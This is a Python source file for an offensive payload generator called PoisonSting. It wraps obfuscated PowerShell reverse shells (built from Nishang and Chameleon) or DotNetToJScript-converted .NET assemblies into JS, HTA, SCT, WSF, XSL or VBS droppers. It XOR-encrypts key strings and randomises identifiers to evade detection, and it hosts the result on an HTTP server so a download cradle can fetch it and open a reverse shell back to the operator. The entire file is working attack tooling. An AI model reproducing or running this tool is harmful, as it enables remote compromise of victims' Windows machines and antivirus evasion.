from http.server import HTTPServer, SimpleHTTPRequestHandler
import os
import base64
import random
import string
import sys
import argparse
from jsmin import jsmin
import json
import subprocess
from colorama import Fore
import argparse
from chameleon import Chameleon
import socket

BRED = Fore.LIGHTRED_EX
BWHITE = Fore.LIGHTWHITE_EX
BBLUE = Fore.LIGHTBLUE_EX
BGREEN = Fore.LIGHTGREEN_EX
BYELLOW = Fore.LIGHTYELLOW_EX
BNEON = Fore.LIGHTCYAN_EX
BMAGENTA = Fore.MAGENTA


class PoisonSting:

    def __init__(self, args):
        self.input_assembly_file = args.get("InputAssemblyfile")
        self.payload_lang = args.get("Language")
        self.ScriptMaker = args.get("ScriptMaker")
        self.ReversePort = args.get("ReversePort")
        self.IP = args.get("IP")
        self.Port = args.get("Port")
        self.variable_name = ''.join(random.choice(
            string.ascii_letters) for _ in range(10))
        self.arrayname = ''.join(random.choice(
            string.ascii_letters) for _ in range(10))
        self.Newarrayname = ''.join(random.choice(
            string.ascii_letters) for _ in range(10))
        self.DownloaCradle = ""
        self.key = random.randint(1, 10)

        

    def PrintBanner(self):
        banner = """
        
 ███████████            ███                               █████████   █████     ███                     
░░███░░░░░███          ░░░                               ███░░░░░███ ░░███     ░░░                      
 ░███    ░███  ██████  ████   █████   ██████  ████████  ░███    ░░░  ███████   ████  ████████    ███████
 ░██████████  ███░░███░░███  ███░░   ███░░███░░███░░███ ░░█████████ ░░░███░   ░░███ ░░███░░███  ███░░███
 ░███░░░░░░  ░███ ░███ ░███ ░░█████ ░███ ░███ ░███ ░███  ░░░░░░░░███  ░███     ░███  ░███ ░███ ░███ ░███
 ░███        ░███ ░███ ░███  ░░░░███░███ ░███ ░███ ░███  ███    ░███  ░███ ███ ░███  ░███ ░███ ░███ ░███
 █████       ░░██████  █████ ██████ ░░██████  ████ █████░░█████████   ░░█████  █████ ████ █████░░███████
░░░░░         ░░░░░░  ░░░░░ ░░░░░░   ░░░░░░  ░░░░ ░░░░░  ░░░░░░░░░     ░░░░░  ░░░░░ ░░░░ ░░░░░  ░░░░░███
                                                                                                ███ ░███
                                                                                               ░░██████ 
                                                                                                ░░░░░░  
        """
        print(BWHITE + banner)

    def CraftPowershellBasedPayload(self):
        config = {
            "strings": True,
            "variables": True,
            "data-types": False,
            "functions": True,
            "comments": False,
            "spaces": True,
            "cases": True,
            "nishang": True,
            "backticks": False,
            "random-backticks": False,
            "backticks-list": False,
            "hex-ip": False,
            "random-type": "r",
            "decimal": False,
            "base64": False,
            "tfn-values": False,
            "safe": False,
            "verbose": True
        }
        outputdir = os.path.join(os.getcwd(), "Output")
        nishangRevScript = os.path.join(
            os.getcwd(), "PsScripts", "ReverseShell.ps1")
        DownloadCradle = os.path.join(
            os.getcwd(), "PsScripts", "pwershellpayload")
        nishangObfuscatedOutPut = os.path.join(outputdir, "output.ps1")
        PowershellScriptname = self.generate_random_name()
        ScripttoServe = os.path.join(outputdir, PowershellScriptname)
        self.Clean_output_dir(outputdir)
        object = Chameleon(
            nishangRevScript, nishangObfuscatedOutPut, config=config, fmap=None)
        object.obfuscate()
        object.write_file()
        pacthedpPowershellPayload = self.PatchPowershellPayload(
            nishangObfuscatedOutPut)
        with open(ScripttoServe, 'w') as file:
            file.write(pacthedpPowershellPayload)
        patchedDownloaCradle = self.CraftDownloadCradle(
            DownloadCradle, PowershellScriptname)
        return patchedDownloaCradle

    def CraftDownloadCradle(self, DownloadCradle, PowershellScriptname):
        payload = self.read_file(DownloadCradle)
        payload = payload.replace("%IP%", self.IP).replace(
            "%PORT%", self.Port).replace("%SCRIPTNAME%", PowershellScriptname)
        return payload

    def base64encode(self, payloadpart):
        base64_bytes = base64.b64encode(payloadpart.encode("ascii"))
        base64_string = base64_bytes.decode("ascii")
        return base64_string

    def run_DotnetoJS(self, executable_path, parameters):
        try:
            # Using subprocess.run to run the executable with parameters
            result = subprocess.run([executable_path] + parameters, check=True,
                                    stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

            # Print the output of the executable
            assemblyblob = result.stdout

            # Print any errors or exceptions
            if result.stderr:
                print("Errors:", result.stderr)

        except subprocess.CalledProcessError as e:
            # Handle any errors raised by the subprocess
            print(f"Error: {e}")
        except Exception as e:
            # Handle other exceptions
            print(f"Exception: {e}")
        return assemblyblob.rstrip('\n')

    def split_and_format_string(self, input_string, codeappender, stringterminator, variabledecalare):
        # Split the input string into 15 equal parts
        split_parts = [input_string[i:i + 15]
                       for i in range(0, len(input_string), 15)]

        # Generate a randomized variable name
        variable_name = self.variable_name

        # Create the formatted string with new line
        formatted_string = f'{variabledecalare} {variable_name} = "{split_parts[0]}"{stringterminator}\n'

        for part in split_parts[1:]:
            formatted_string += f'{variable_name} = {variable_name} {codeappender} "{part}"{stringterminator}\n'
        # print(formatted_string)
        return formatted_string

    def genratepayload(self):
        exe_path = "DotnetoJsBinary/DotNetToJScript.exe"
        params = ["-oA", "assemblyblob", "-v", "v4 ", self.input_assembly_file]
        if self.payload_lang in ["js", "hta", "sct", "wsf"]:
            codeappender = "+"
            stringterminator = ";"
            variabledecalare = "var"
        else:
            codeappender = "&"
            stringterminator = ""
            variabledecalare = ""
        payload = self.split_and_format_string(self.Encrypt(self.run_DotnetoJS(
            exe_path, params)), codeappender, stringterminator, variabledecalare)
        # print(payload)
        return payload

    def CraftPayload(self):
        self.PrintBanner()
        payload = None
        if (self.ScriptMaker == "DotnettoJS"):
            if self.payload_lang.lower()  == "js":
                payload = self.SaveIntoJsTemplate()
            elif self.payload_lang.lower()  == "hta":
                payload = self.SaveIntoHtaTemplate(self.SaveIntoJsTemplate())
            elif self.payload_lang.lower()  == "sct":
                payload = self.SaveIntoSct(self.SaveIntoJsTemplate())
            elif self.payload_lang.lower()  == "wsf":
                payload = self.SaveIntoWsf(self.SaveIntoJsTemplate())
            elif self.payload_lang == "xsl":
                payload = self.SaveIntoXsl(self.SaveIntoJsTemplate())
        elif (self.ScriptMaker.lower() == "powershell"):
            dwnloadcradle = self.CraftPowershellBasedPayload()
            if self.payload_lang.lower() == "js":
                payload = self.PsJscriptTemplate(dwnloadcradle)
            elif self.payload_lang.lower()  == "vbs":
                payload = self.PsVbsTemplate(dwnloadcradle)
            elif self.payload_lang.lower()  == "hta":
                payload = self.SaveIntoHtaTemplate(
                    self.PsJscriptTemplate(dwnloadcradle))
            elif self.payload_lang.lower()  == "sct":
                payload = self.SaveIntoSct(
                    self.PsJscriptTemplate(dwnloadcradle))
            elif self.payload_lang.lower()  == "wsf":
                payload = self.SaveIntoWsf(
                    self.PsJscriptTemplate(dwnloadcradle))
            elif self.payload_lang.lower()  == "xsl":
                payload = self.SaveIntoXsl(
                    self.PsJscriptTemplate(dwnloadcradle))

        # print(payload)
        payloadFileName= self.SavethePayload(payload)
        start_server(self.IP, int(self.Port),payloadFileName)

    def read_file(self, file_path):
        with open(file_path, 'r') as fs:
            content = fs.read()
        return content

    def xor(self, key, text):
        encrypted_text = ""
        for char in text:
            text_char = ord(char)
            encrypted_char = text_char ^ key
            encrypted_text += chr(encrypted_char)
        return encrypted_text

    def SavethePayload(self, payload):
        outputFileName=''.join(random.choice(
            string.ascii_letters) for _ in range(6))
        outputFilePath = os.path.join(os.getcwd(), "Output", outputFileName)
        with open(outputFilePath, 'w') as file:
            file.write(payload)
        print(
            BGREEN + "[+] Payload has has been saved and written into", outputFilePath)
        return  outputFileName      
    def SaveIntoHtaTemplate(self, payload):
        print(BNEON + "[+] Crafting the HTA Payload...")
        templatefile = self.read_file("templates/HtaTemplate.hta")
        payload = templatefile.replace("%JSCRIPTPAYLOAD%", payload)
        return payload

    def PsJscriptTemplate(self, DownloaCradle):
        print(BYELLOW + "[+] Crafting the JS Payload...")
        templatefile = self.read_file("templates/PsJscriptTemplate.js")
        payload = templatefile.replace("%PAYLOAD%", DownloaCradle).replace("%FUNCTIONAME%", ''.join(random.choice(
            string.ascii_letters) for _ in range(8))).replace("%ShellOBJECT%", ''.join(random.choice(string.ascii_letters) for _ in range(14)))
        return jsmin(payload)

    def PsVbsTemplate(self, dwnloadcradle):
        print(BRED + "[+] Crafting the Vbs Payload...")
        templatefile = self.read_file("templates/PsVbsTemplate.vbs")
        payload = templatefile.replace("%PAYLOAD%", dwnloadcradle)
        return payload

    def GenerateRandomWords(self):
        characters = 'abcdefghijklmnopqrstuvwxyz'
        random_word = ''.join(random.choice(characters) for _ in range(5))
        return random_word

    def SaveIntoJsTemplate(self):
        print(BGREEN + "[+] Crafting the JS Payload...")
        templatefile = self.read_file("templates/JscriptTemplate.js")
        payload = templatefile.replace("%B64PAYLOAD%", self.genratepayload())
        # payload = payload.replace("%ENTRYCLASS%", entryclass)
        payload = payload.replace("%VAR%", self.variable_name)
        payload = payload.replace("%KEY%", str(self.key))
        payload = payload.replace("%ARRAY%", self.variables())
        payload = payload.replace("%ARRAYNAME%", self.arrayname)
        payload = payload.replace("%NEWARRAY%", self.Newarrayname)
        payload = payload.replace("%PROGID%", self.GenerateRandomWords())
        # print(self.variables())
        payload_minified = jsmin(payload)
        return payload_minified

    def PatchPowershellPayload(self, nishangobfuscatedOutPut):
        print(BBLUE + "[+] Crafting the Powershell Payload...")
        payload = self.read_file(nishangobfuscatedOutPut)
        payload = payload.replace(
            "%IPADDRESS%", self.IP).replace("%PORT%", self.ReversePort)
        return payload

    def SaveIntoSct(self, template_payload):
        print(BGREEN + "[+] Crafting the SCT Payload...")
        templatefile = self.read_file("templates/SctTemplate.sct")
        payload = templatefile.replace("%JSCRIPTPAYLOAD%", template_payload)
        return payload

    def generate_random_name(self):
        # List of vowels and consonants
        vowels = "aeiou"
        consonants = "bcdfghjklmnpqrstvwxyz"

        # Randomly choose the length of the name (between 5 and 10 characters)
        name_length = random.randint(5, 10)

        # Generate the name
        name = ""
        for i in range(name_length):
            if i % 2 == 0:
                name += random.choice(consonants)
            else:
                name += random.choice(vowels)

        return name.capitalize()

    def SaveIntoXsl(self, template_payload):
        print(BGREEN + "[+] Crafting the XSL Payload...")
        templatefile = self.read_file("templates/XslTemplate.xsl")
        payload = templatefile.replace("%PAYLOAD%", template_payload)
        return payload

#  wscript C:\Users\Arinjoy\project\Examples\calc.wsf

    def SaveIntoWsf(self, template_payload):
        print(BGREEN + "[+] Crafting the WSF Payload...")
        templatefile = self.read_file("templates/WsfTemplate.wsf")
        payload = templatefile.replace("%PAYLOAD%", template_payload)
        return payload

    def Convert_array_in_js_format(self, arr):
        js_code = f"var {self.arrayname} = {json.dumps(arr)};"
        return js_code

    def variables(self):
        # Generate a randomized variable name
        variables = ["WScript.Shell", "Process", "COMPLUS_Version", "v4.0.30319", "System.Text.ASCIIEncoding", "System.Security.Cryptography.FromBase64Transform",
                     "System.IO.MemoryStream", "System.Runtime.Serialization.Formatters.Binary.BinaryFormatter", "System.Collections.ArrayList"]
        encryptedVariables = []
        for x in variables:
            encryptedVariables.append(self.Encrypt(x))
        return self.Convert_array_in_js_format(encryptedVariables)

    def Encrypt(self, contents_to_encrypt):
        payload_encrypted = self.xor(self.key, contents_to_encrypt)
        payload_bytes = payload_encrypted.encode('utf-8')
        payload_encoded = base64.b64encode(payload_bytes).decode('utf-8')

        return payload_encoded

    def Clean_output_dir(self, directory_path):
        try:
            # Use os.scandir() for better performance and memory efficiency
            with os.scandir(directory_path) as entries:
                for entry in entries:
                    if entry.is_file():
                        os.remove(entry.path)
        except OSError as e:
            pass


class CustomHTTPRequestHandler(SimpleHTTPRequestHandler):
    def __init__(self, *args, directory="Output", **kwargs):
        super().__init__(*args, directory=directory, **kwargs)

class ServerInstantiate(HTTPServer):
    def __init__(self, server_address, RequestHandlerClass):
        super().__init__(server_address, RequestHandlerClass)

def is_valid_ip(ip):
    try:
        # Attempt to create a socket with the provided IP address
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind((ip, 0))  # Try to bind to the IP address with a random port
        return True
    except (socket.error, ValueError):
        return False

def start_server(ip, port,payloadFileName):
    if not is_valid_ip(ip):
        print(BRED + "[!]" + BWHITE + " Error: Invalid IP address provided. Could not start the Web server.")
        return
    try:
        print(BNEON + "[+] Starting the Server...")
        server_address = (ip, port)
        Server = ServerInstantiate(server_address, CustomHTTPRequestHandler)
        print(BRED + f"[+] Server is listening on {ip}:{port}...")
        print(BMAGENTA + f"[+] payload URI is http://{ip}:{port}/{payloadFileName}")
        print(BRED + f"[+] Press Ctrl+C to stop the server.")
        Server.serve_forever()
    except KeyboardInterrupt:
        print(BWHITE + "\n[!] Server stopped by user.")
        Server.shutdown()

def help():
        print(BGREEN + f"For help, use: python {sys.argv[0]} --help")
        exit()
def main():
    # Create an ArgumentParser
    parser = argparse.ArgumentParser(description="PoisonSting Tool")

    # Add command-line arguments for the script maker, input assembly file, output file, payload language, IP, and port
    parser.add_argument(
        "--ScriptMaker", help="Select the script maker: PowerShell (P) or DotnettoJscript (J)")
    parser.add_argument("--InputAssemblyfile",
                        help="Path to the assembly file to be processed")
    parser.add_argument(
        "--Language", help="Payload Language (js, hta, sct, wsf)")
    parser.add_argument("--IP", help="Enter your IP to serve the payload")
    parser.add_argument("--Port", help="Enter the port to serve the payload")
    parser.add_argument("--ReversePort", help="Enter the port for  the reverseshell")

    # Parse the command-line arguments
    args = vars(parser.parse_args())
    if args.get("ScriptMaker", "").lower() == 'powershell':  # PowerShell script
        if not args.get("ReversePort"):
            print(BRED + f"Warning: Reverse port not provided. Please specify the reverse port to connect to.")
            help()
        if not args.get("IP"):
            print(BRED + f"Warning: IP address not provided. Please specify the IP address to serve the payload.")
            help()
        if not args.get("Port"):
            print(BRED + f"Warning: Port not provided. Please specify the port to serve the payload.")
            help()
        if args.get("Language"):
            if args.get("Language").lower() not in ['js', 'hta', 'sct', 'wsf', 'xsl', 'vbs']:
                print(
                    BRED + f"Warning: Invalid Payload Language. Please use one of the following: js, hta, sct, wsf, xsl, vbs")
                help()
            else:
                PoisonSting_instance = PoisonSting(args)
                PoisonSting_instance.CraftPayload()
        else:
            print("Error: Please provide input assembly file, output file name, and payload language for PowerShell script.")
    elif args.get("ScriptMaker", "").lower() == 'dotnettojscript':  # DotnettoJscript script
        if args.get("InputAssemblyfile") and args.get("Language"):
            if args.get("Language").lower() not in ['js', 'hta', 'sct', 'wsf', 'xsl']:
                print(
                    "Warning: Invalid Payload Language. Please use one of the following: js, hta, sct, wsf, xsl")
                help()
            else:
                PoisonSting_instance = PoisonSting(args)
                PoisonSting_instance.CraftPayload()
        else:
            print("Error: Please provide input assembly file, output file name, and payload language for DotnettoJscript script.")
    else:
        print("Invalid choice. Please enter 'P' for PowerShell script or 'J' for DotnettoJscript based script.")


if __name__ == "__main__":
    main()